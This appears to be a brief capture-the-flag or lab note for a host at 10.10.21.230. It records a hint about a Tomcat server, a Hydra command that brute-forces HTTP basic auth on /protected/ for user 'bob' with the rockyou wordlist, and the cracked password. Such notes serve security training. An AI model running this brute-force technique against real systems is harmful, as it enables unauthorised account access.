# 10.10.21.230



/guidlines -> Hey bob, did you update that TomCat server?



Hydra /protected/ that has basic auth:

hydra -l bob -P ~/wordlists/rockyou.txt -f 10.10.21.230 http-get /protected/ 


[80][http-get] host: 10.10.21.230   login: bob   password: bubbles

